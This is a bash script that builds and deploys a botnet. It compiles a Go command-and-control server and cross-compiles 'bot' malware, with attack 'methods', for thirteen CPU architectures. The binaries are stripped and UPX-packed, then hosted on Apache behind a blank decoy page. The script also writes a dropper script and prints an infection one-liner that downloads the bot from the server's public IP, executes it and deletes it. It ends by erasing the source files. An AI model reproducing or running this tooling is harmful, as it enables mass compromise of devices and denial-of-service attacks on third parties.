#!/bin/bash

cd cnc
go mod tidy
go build
mv cnc server
mv server ~/
cd ~/
echo

ARCHS=(
    "aarch64"
    "i386"
    "loongarch64"
    "m68k"
    "microblaze"
    "mips"
    "or1k"
    "powerpc"
    "riscv32"
    "riscv64"
    "sh2"
    "sh4"
    "x86_64"
)

CROSSTOOL_VERSION="15.2.0"
RELEASE_DIR="$HOME/release"
BINS_DIR="$RELEASE_DIR/bins"
SECRET="gjrigrhe"
WWWROOT="/var/www/html"

mkdir -p "$RELEASE_DIR"
mkdir -p "$BINS_DIR"

for arch in "${ARCHS[@]}"; do
    output_file="xnxnxnxnxnxnxnxn${arch}xnxn"
    output_path="${BINS_DIR}/${output_file}"

    echo "Compiling $arch..."

    compiler="${arch}-linux-gcc"
    sysroot="/opt/crosstool-${CROSSTOOL_VERSION}/gcc-${CROSSTOOL_VERSION}-nolibc/${arch}-linux/sysroot"

    if ! command -v "$compiler" &>/dev/null; then
        echo "Compiler not found: $compiler"
        continue
    fi

    include_sysroot_usr="${sysroot}/usr/include"
    include_gcc_internal="/opt/crosstool-${CROSSTOOL_VERSION}/gcc-${CROSSTOOL_VERSION}-nolibc/${arch}-linux/lib/gcc/${arch}-linux/${CROSSTOOL_VERSION}/include"

    "$compiler" \
        --sysroot="$sysroot" \
        -std=c99 \
        -nostdinc \
        -isystem "$include_sysroot_usr" \
        -isystem "$include_gcc_internal" \
        bot/*.c bot/methods/*.c \
        -static -O3 -fomit-frame-pointer \
        -fdata-sections -ffunction-sections \
        -Wl,--gc-sections \
        -o "$output_path" -lpthread -DBArch=\"$arch\"

    if [ $? -eq 0 ]; then
        strip_tool="${arch}-linux-strip"
        if command -v "$strip_tool" &>/dev/null; then
            "$strip_tool" "$output_path" -S --strip-unneeded \
                --remove-section=.note.gnu.gold-version \
                --remove-section=.comment \
                --remove-section=.note \
                --remove-section=.note.gnu.build-id \
                --remove-section=.note.ABI-tag \
                --remove-section=.jcr \
                --remove-section=.got.plt \
                --remove-section=.eh_frame \
                --remove-section=.eh_frame_ptr \
                --remove-section=.eh_frame_hdr
        else
            echo "Strip tool not found for $arch, skipping strip."
        fi
        chmod +x "$output_path"
        echo "$arch compiled successfully!"
        ls -lh "$output_path"
    else
        echo "$arch compilation FAILED."
    fi
    echo
done

sudo rm -rf "${WWWROOT:?}/"*
sudo mkdir -p "${WWWROOT}/bins"
sudo chown -R www-data:www-data "$BINS_DIR"
sudo cp -r "$BINS_DIR/"* "${WWWROOT}/bins/"

cd /tmp
wget -q https://github.com/upx/upx/releases/download/v5.0.2/upx-5.0.2-amd64_linux.tar.xz -O upx.tar.xz
tar -xf upx.tar.xz
UPX_EXEC=$(find . -name upx -type f | head -n 1)
if [ -n "$UPX_EXEC" ]; then
    "$UPX_EXEC" --best --ultra-brute "$BINS_DIR"/* || true
    "$UPX_EXEC" --best --ultra-brute "${WWWROOT}/bins"/* || true
    echo "Binaries packed."
else
    echo "UPX executable not found."
fi
rm -rf upx*
cd ~/


sudo systemctl reload apache2

sudo mkdir -p "${WWWROOT}/bins"
sudo chown -R www-data:www-data "${WWWROOT}/bins"

sudo tee /var/www/html/index.html > /dev/null <<'HTML'
<!doctype html>
<html lang="th">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title></title>
  <style>
    html,body{height:100%;margin:0;background:#ffffff;}
  </style>
</head>
<body>
  <!-- intentionally blank -->
</body>
</html>
HTML

touch /var/www/html/.htaccess
cat << EOF > /var/www/html/.htaccess
Options -Indexes
DirectoryIndex index.html
EOF

PUBLIC_IP=$(curl -s https://ifconfig.me)
PAYLOAD_SCRIPT_PATH="${WWWROOT}/run.sh"

for arch in "${ARCHS[@]}"; do
    binary_name="xnxnxnxnxnxnxnxn${arch}xnxn"
    echo "wget http://${PUBLIC_IP}/bins/${binary_name}; curl -O http://${PUBLIC_IP}/bins/${binary_name}; chmod +x ${binary_name}; ./${binary_name}; rm -rf ${binary_name}" >> "$PAYLOAD_SCRIPT_PATH"
done

echo "Payload command:"
echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://${PUBLIC_IP}/run.sh; curl -O http://${PUBLIC_IP}/run.sh; chmod 777 run.sh; sh run.sh; rm -rf run.sh"

rm -rf bot cnc build.sh package.sh install.txt go
exit 0